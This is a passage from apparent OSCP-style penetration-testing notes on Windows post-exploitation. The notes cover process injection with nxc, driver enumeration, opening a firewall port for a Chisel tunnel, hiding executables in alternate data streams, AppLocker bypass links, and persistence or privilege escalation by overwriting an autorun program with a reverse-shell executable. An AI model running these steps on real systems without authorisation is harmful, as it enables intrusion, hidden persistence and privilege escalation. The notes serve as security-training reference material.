[#cracking-net-ntlmv2](../../enumeration/passwords.md#cracking-net-ntlmv2 "mention")

[#relaying-net-ntlmv2](../../enumeration/passwords.md#relaying-net-ntlmv2 "mention")

## Process Injection

{% code overflow="wrap" fullWidth="true" %}
```bash
nxc <IP> -u username -p password -M pi -o PID=<target_process_pid> EXEC=<command>
```
{% endcode %}

## Process Migration

[https://pentestlab.blog/tag/pid/\
https://resources.infosecinstitute.com/topics/penetration-testing/poor-mans-process-migration-windows/](https://pentestlab.blog/tag/pid/https://resources.infosecinstitute.com/topics/penetration-testing/poor-mans-process-migration-windows/)

## Windows Kernels / Drivers

{% code overflow="wrap" fullWidth="true" %}
```sh
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---evaluating-vulnerable-drivers

driverquery /fo /v
PS > driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
PS > Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

# Check third-party drivers, Windows are usually more patched
# Then search for exploits
# Try to grab drivers version from C:\Windows\System32\DRIVERS or Program Files
```
{% endcode %}

## Windows Image Backup

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.howtogeek.com/howto/34630/how-to-recover-specific-files-from-a-windows-system-image/

# Mount .vhd files (virtual hard drive)
sudo apt install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd # For read-only, create first /mnt/vhd
```
{% endcode %}

## C# (Online) compiler / debugger

```sh
https://www.onlinegdb.com/online_csharp_compiler

# Online 
https://dotnetfiddle.net/
NOTE: to get variables use System.Console.Writeline(myvar)
Main() is required in every code snippet, take it into account
```

## Windows Debugger&#x20;

[https://github.com/x64dbg/x64dbg](https://github.com/x64dbg/x64dbg)

Open the app > Run to user code > then Find strings > F2 to insert a breakpoint

## Firewall

{% code overflow="wrap" fullWidth="true" %}
```bash
https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/windows-firewall-with-advanced-security-administration-with-windows-powershell
https://woshub.com/manage-windows-firewall-powershell/

# Enumerating Firewall Status and Rules
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

# Open port with firewalld
firewall-cmd --zone=public --add-port $PORT/tcp

netsh advfirewall firewall add rule name="Chisel-MuirlandOracle" dir=in action=allow protocol=tcp localport=47000
```
{% endcode %}

## Alternate Data Stream

{% code overflow="wrap" fullWidth="true" %}
```c
https://www.jankyrobotsecurity.com/2019/04/15/alternate-data-streams-redux/
https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#alternate-data-streams-cheatsheet-a-ds-alternate-data-stream

expand c:\ads\file.txt:test.exe c:\temp\evil.exe

echo calculator.exe > Calculator
# for this specific example using C:\, the file is never shown even checking hidden files but this technique needs administrator privileges
PS> Get-Content .\file.txt | Set-Content C:\ -Stream Calc

PS> Get-Content .\file.txt -Stream *
C:\> dir /r
```
{% endcode %}

## Symlink (SysInternals)

```
CreateSymlink.exe "C:\SYMLINK_FILE" "C:\REAL_FILE"
```

## MSSQL Server

{% content-ref url="../../enumeration/ports/1435-mssql.md" %}
[1435-mssql.md](../../enumeration/ports/1435-mssql.md)
{% endcontent-ref %}

## **AppLocker Bypass**

_.exe failed to executed: This program is blocked by group policy_

That means we have to move it to a folder where AppLocker can be bypassed

[https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)

## **BitLocker keys**

[**https://github.com/p0dalirius/ExtractBitlockerKeys**](https://github.com/p0dalirius/ExtractBitlockerKeys)

## **Startup Applications / Autorun**

{% code overflow="wrap" fullWidth="true" %}
```bash
(LESS APPLICABLE FOR OSCP)

####### STARTUP APPLICATIONS
# 1. Detect if vulnerable: Check if you have write permissions to startup folder
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# 2. Exploit: generate msfpayload and place it in this folder 
# 3. Restart the machine with Administrator credentials

########### AUTORUN
# Query the registry for AutoRun executables:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Check if the executable can be modified by everyone:
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
# Copy a malicious executable to overwrite the original executable:
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
# Now we need an admin to log in in order to achieve privesc.
```
{% endcode %}

## HTTP server (.exe) for Windows

[https://github.com/faustinoaq/sswws](https://github.com/faustinoaq/sswws)

## Resources -

* [https://blog.harmj0y.net/](https://blog.harmj0y.net/)
* [https://adsecurity.org/?page\_id=1821](https://adsecurity.org/?page_id=1821)
* [https://metasploit.help.rapid7.com/docs/about-post-exploitation](https://metasploit.help.rapid7.com/docs/about-post-exploitation)
* [http://www.pentest-standard.org/index.php/Post\_Exploitation](http://www.pentest-standard.org/index.php/Post_Exploitation)
* [https://offsec.red/mimikatz-cheat-sheet/](https://offsec.red/mimikatz-cheat-sheet/)
* [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
